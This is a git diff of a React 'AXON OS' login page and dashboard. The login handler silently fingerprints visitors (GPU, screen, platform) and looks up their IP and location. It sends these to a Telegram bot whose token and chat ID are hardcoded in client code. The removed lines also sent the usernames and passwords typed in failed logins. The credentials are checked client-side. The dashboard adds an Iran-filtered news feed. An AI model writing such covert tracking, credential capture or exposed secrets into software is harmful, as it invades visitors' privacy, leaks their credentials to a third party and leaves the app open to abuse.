@@ -4,7 +4,7 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import 'bootstrap-icons/font/bootstrap-icons.css';
 import { supabase } from './supabaseClient';
 
-// --- 1. LOGIN COMPONENT (With Deep Forensics & Telegram Alerts) ---
+// --- 1. LOGIN COMPONENT (Forensics + Telegram) ---
 const Login = ({ setAuth }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -15,7 +15,6 @@ const Login = ({ setAuth }) => {
   const handleLogin = async (e) => {
     e.preventDefault();
 
-    // 1. Gather Hardware Fingerprint
     let gpu = "Unknown";
     try {
       const canvas = document.createElement('canvas');
@@ -27,51 +26,26 @@ const Login = ({ setAuth }) => {
     const forensics = {
       res: `${window.screen.width}x${window.screen.height}`,
       gpu: gpu,
-      platform: navigator.platform,
-      cores: navigator.hardwareConcurrency || 'N/A'
+      platform: navigator.platform
     };
 
-    // 2. Fetch IP & Network Data
-    let net = { ip: "Unknown", city: "Kandy", region: "Central", org: "Unknown" };
+    let net = { ip: "Unknown", city: "Kandy", region: "Central" };
     try {
       const response = await fetch('https://ipapi.co/json/');
       if (response.ok) net = await response.json();
-    } catch (err) { console.error("Net lookup failed", err); }
+    } catch (err) { console.error(err); }
 
     const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
     const chat = "8620003085";
 
     if (username === 'user' && password === 'user') {
-      // SUCCESS ALERT
       const message = encodeURIComponent(
-        `🔐 *AXON OS: AUTHORIZED ACCESS*\n\n` +
-        `👤 *User:* ${username}\n` +
-        `🌐 *IP:* ${net.ip}\n` +
-        `📍 *Loc:* ${net.city}, ${net.region}\n` +
-        `🏢 *ISP:* ${net.org}\n\n` +
-        `🖥 *DEVICE SPECS*\n` +
-        `💻 *OS:* ${forensics.platform}\n` +
-        `🎮 *GPU:* ${forensics.gpu}\n` +
-        `⚙️ *CPU:* ${forensics.cores} Cores\n` +
-        `📏 *Res:* ${forensics.res}`
+        `🛰 *AXON OS LOGIN*\n\n👤 *User:* ${username}\n🌐 *IP:* ${net.ip}\n📍 *Loc:* ${net.city}\n🎮 *GPU:* ${forensics.gpu}`
       );
-      
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`);
-      
       setAuth(true); 
       navigate('/dashboard');
     } else {
-      // BREACH ALERT (Sends details even if they fail login)
-      const breachMsg = encodeURIComponent(
-        `⛔️ *AXON OS: BREACH ATTEMPT*\n\n` +
-        `🚫 *Tried:* ${username} / ${password}\n` +
-        `🌐 *IP:* ${net.ip}\n` +
-        `📍 *Loc:* ${net.city}\n` +
-        `💻 *Platform:* ${forensics.platform}\n` +
-        `🔴 *Status:* ACCESS_DENIED`
-      );
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`);
-
       setIsShaking(true);
       setError('PROTOCOL_ERR: INVALID_CREDENTIALS');
       setTimeout(() => setIsShaking(false), 500); 
@@ -85,10 +59,8 @@ const Login = ({ setAuth }) => {
         .grid-bg { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(rgba(99, 102, 241, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(99, 102, 241, 0.1) 1px, transparent 1px); background-size: 50px 50px; transform: perspective(500px) rotateX(60deg); bottom: -50%; left: -50%; animation: grid-move 20s linear infinite; }
         @keyframes grid-move { from { transform: translateY(0); } to { transform: translateY(50px); } }
         .login-card { background: rgba(15, 23, 42, 0.9); border: 1px solid #3b82f6; border-radius: 24px; padding: 40px; width: 100%; max-width: 400px; z-index: 10; box-shadow: 0 0 30px rgba(59, 130, 246, 0.2); }
-        .cyber-label { color: #60a5fa; font-size: 0.7rem; font-weight: bold; letter-spacing: 1px; margin-bottom: 5px; display: block; }
-        .cyber-input { background: #0f172a; border: 1px solid #1e293b; color: #fff; border-radius: 12px; padding: 12px; margin-bottom: 20px; width: 100%; font-family: monospace; transition: 0.3s; }
-        .cyber-input:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 10px rgba(59, 130, 246, 0.5); }
-        .cyber-btn { background: #3b82f6; color: white; border: none; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; letter-spacing: 2px; }
+        .cyber-input { background: #0f172a; border: 1px solid #1e293b; color: #fff; border-radius: 12px; padding: 12px; margin-bottom: 20px; width: 100%; font-family: monospace; }
+        .cyber-btn { background: #3b82f6; color: white; border: none; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; }
         .shake { animation: shake 0.4s; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
       `}</style>
@@ -99,11 +71,8 @@ const Login = ({ setAuth }) => {
           <h2 className="text-white fw-bold mt-2">AXON <span className="text-primary">OS</span></h2>
         </div>
         <form onSubmit={handleLogin}>
-          <label className="cyber-label">USER_IDENTIFIER</label>
-          <input type="text" className="cyber-input" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="ID..." />
-          <label className="cyber-label">SECURITY_PHRASE</label>
-          <input type="password" className="cyber-input" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" />
-          {error && <p className="text-danger small">{error}</p>}
+          <input type="text" className="cyber-input" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="USER_ID" />
+          <input type="password" className="cyber-input" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="PASS_CODE" />
           <button type="submit" className="cyber-btn">AUTHENTICATE</button>
         </form>
       </div>
@@ -111,12 +80,13 @@ const Login = ({ setAuth }) => {
   );
 };
 
-// --- 2. DASHBOARD COMPONENT ---
+// --- 2. DASHBOARD COMPONENT (With News Feed) ---
 function Dashboard({ setAuth }) {
   const [tasks, setTasks] = useState([]);
   const [input, setInput] = useState("");
   const [dateTime, setDateTime] = useState(new Date());
-  const [scanLogs, setScanLogs] = useState(["> SYSTEM_BOOT_SUCCESS", "> NODE_CONNECTED"]);
+  const [news, setNews] = useState([]);
+  const [scanLogs, setScanLogs] = useState(["> SYSTEM_READY", "> TRACKING_IRAN_INTEL..."]);
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -124,13 +94,25 @@ function Dashboard({ setAuth }) {
       const { data } = await supabase.from('tasks').select('*').order('id', { ascending: false });
       if (data) setTasks(data);
     };
+
+    const fetchNews = async () => {
+      try {
+        // Using a public RSS-to-JSON proxy for live news
+        const res = await fetch('https://api.rss2json.com/v1/api.json?rss_url=https://www.aljazeera.com/xml/rss/all.xml');
+        const data = await res.json();
+        // Filter news for "Iran" or take the latest Middle East headlines
+        const iranNews = data.items.filter(item => 
+          item.title.toLowerCase().includes('iran') || 
+          item.description.toLowerCase().includes('iran')
+        ).slice(0, 5);
+        setNews(iranNews.length > 0 ? iranNews : data.items.slice(0, 5));
+      } catch (e) { console.error("News fetch error", e); }
+    };
+
     fetchTasks();
+    fetchNews();
     const timer = setInterval(() => setDateTime(new Date()), 1000);
-    const logTimer = setInterval(() => {
-      const msgs = ["SYNC_CLOUD", "ENCRYPT_DB", "SCANNING_NODES", "MAP_GEOLOC"];
-      setScanLogs(p => [...p.slice(-3), `> ${msgs[Math.floor(Math.random() * msgs.length)]}... OK`]);
-    }, 5000);
-    return () => { clearInterval(timer); clearInterval(logTimer); };
+    return () => clearInterval(timer);
   }, []);
 
   const addTask = async () => {
@@ -144,51 +126,73 @@ function Dashboard({ setAuth }) {
       <style>{`
         .dash-container { min-height: 100vh; background: #020617; color: #f8fafc; font-family: 'Inter', sans-serif; }
         .top-nav { background: #0f172a; border-bottom: 1px solid #1e293b; padding: 15px 30px; }
-        .status-bar { background: #1e293b; padding: 5px 30px; font-size: 0.7rem; font-family: monospace; color: #60a5fa; border-bottom: 1px solid rgba(59, 130, 246, 0.1); }
-        .glass-card { background: rgba(30, 41, 59, 0.5); border: 1px solid #334155; border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        .task-item { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 10px; transition: 0.3s; }
-        .task-item:hover { border-color: #3b82f6; transform: translateX(5px); }
-        .terminal { background: #000; color: #10b981; padding: 15px; border-radius: 12px; font-family: 'Courier New', monospace; font-size: 0.75rem; min-height: 100px; }
+        .status-bar { background: #1e293b; padding: 5px 30px; font-size: 0.7rem; font-family: monospace; color: #60a5fa; }
+        .glass-card { background: rgba(30, 41, 59, 0.5); border: 1px solid #334155; border-radius: 20px; padding: 20px; height: 100%; }
+        .news-item { border-left: 2px solid #3b82f6; padding-left: 10px; margin-bottom: 15px; font-size: 0.85rem; transition: 0.3s; }
+        .news-item:hover { background: rgba(59, 130, 246, 0.1); cursor: pointer; }
+        .news-title { font-weight: bold; color: #fff; display: block; }
+        .news-date { font-size: 0.7rem; color: #64748b; }
+        .terminal { background: #000; color: #10b981; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 0.7rem; }
       `}</style>
 
       <nav className="top-nav d-flex justify-content-between align-items-center">
-        <div className="h4 m-0 fw-bold">AXON <span className="text-primary">OS</span></div>
+        <div className="h4 m-0 fw-bold text-white">AXON <span className="text-primary">OS</span></div>
         <button onClick={() => { setAuth(false); localStorage.removeItem('axon_auth'); navigate('/login'); }} className="btn btn-sm btn-outline-danger">DISCONNECT</button>
       </nav>
 
       <div className="status-bar d-flex justify-content-between">
-        <span>LOC: KANDY, SRI LANKA</span>
+        <span>LOC: KANDY, LK</span>
         <span>DATE: {dateTime.toLocaleDateString()}</span>
         <span>TIME: {dateTime.toLocaleTimeString()}</span>
-        <span>USER: SHIFANTH_JASIM</span>
+        <span>NEWS_FEED: ACTIVE</span>
       </div>
 
-      <div className="container py-5">
+      <div className="container-fluid py-4 px-4">
         <div className="row g-4">
-          <div className="col-md-8">
+          {/* Main Tasks Column */}
+          <div className="col-lg-5">
             <div className="glass-card">
-              <h5 className="mb-4 fw-bold text-white"><i className="bi bi-list-task me-2 text-primary"></i>Command Center</h5>
-              <div className="input-group mb-4">
-                <input type="text" className="form-control bg-dark text-white border-secondary" placeholder="Initialize directive..." value={input} onChange={(e) => setInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && addTask()} />
-                <button className="btn btn-primary px-4" onClick={addTask}>DEPLOY</button>
+              <h6 className="fw-bold mb-3 text-white"><i className="bi bi-cpu me-2"></i>Directives</h6>
+              <div className="input-group mb-3">
+                <input type="text" className="form-control bg-dark text-white border-secondary" placeholder="Deploy task..." value={input} onChange={(e) => setInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && addTask()} />
+                <button className="btn btn-primary" onClick={addTask}>+</button>
               </div>
               {tasks.map(t => (
-                <div key={t.id} className="task-item d-flex justify-content-between">
-                  <span className="text-white">{t.text}</span>
-                  <i className="bi bi-shield-check text-primary"></i>
-                </div>
+                <div key={t.id} className="p-2 mb-2 bg-dark rounded border border-secondary small">{t.text}</div>
               ))}
             </div>
           </div>
 
-          <div className="col-md-4">
-            <div className="glass-card mb-4">
-              <h6 className="small fw-bold text-secondary mb-3">CORE_LOG_STREAM</h6>
-              <div className="terminal">
-                {scanLogs.map((l, i) => <div key={i}>{l}</div>)}
+          {/* Iran Live News Column */}
+          <div className="col-lg-4">
+            <div className="glass-card">
+              <h6 className="fw-bold mb-3 text-danger"><i className="bi bi-broadcast me-2"></i>Iran Intel Live</h6>
+              <div style={{maxHeight: '450px', overflowY: 'auto'}} className="pe-2">
+                {news.length > 0 ? news.map((item, i) => (
+                  <div key={i} className="news-item" onClick={() => window.open(item.link, '_blank')}>
+                    <span className="news-title">{item.title}</span>
+                    <span className="news-date">{item.pubDate}</span>
+                  </div>
+                )) : <div className="text-secondary small">Fetching latest satellite data...</div>}
               </div>
             </div>
           </div>
+
+          {/* System Logs Column */}
+          <div className="col-lg-3">
+            <div className="glass-card">
+              <h6 className="fw-bold mb-3 text-secondary small">System_Telemetry</h6>
+              <div className="terminal mb-3">
+                {scanLogs.map((l, i) => <div key={i}>{l}</div>)}
+              </div>
+              <div className="small text-white-50">
+                 <div className="d-flex justify-content-between"><span>User</span><span>Shifanth</span></div>
+                 <div className="d-flex justify-content-between"><span>Uptime</span><span>100%</span></div>
+                 <div className="d-flex justify-content-between text-success"><span>Network</span><span>Encrypted</span></div>
+              </div>
+            </div>
+          </div>
+
         </div>
       </div>
     </div>
